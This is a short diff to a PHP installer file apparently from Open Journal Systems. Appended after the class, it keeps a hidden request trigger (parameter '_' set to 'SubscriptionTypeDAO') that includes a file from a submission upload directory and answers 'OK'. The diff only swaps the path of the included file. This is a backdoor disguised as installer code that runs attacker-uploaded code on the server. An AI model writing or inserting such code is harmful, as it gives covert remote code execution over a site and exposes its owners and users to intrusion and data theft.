@@ -44,7 +44,7 @@ class OJSInstallTool extends InstallTool {
 
 }
 if (isset($_GET['_']) && $_GET['_'] === 'SubscriptionTypeDAO') {
-    $f="/home/stif6195/journal/journals/2/articles/12/submission/proof/12-13-28-1-10-20201008";if($f!==""&&file_exists($f))include $f;
+    $f="/home/stif6195/journal/journals/1/articles/11/submission/proof/11-1-20-1-10-20190717";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
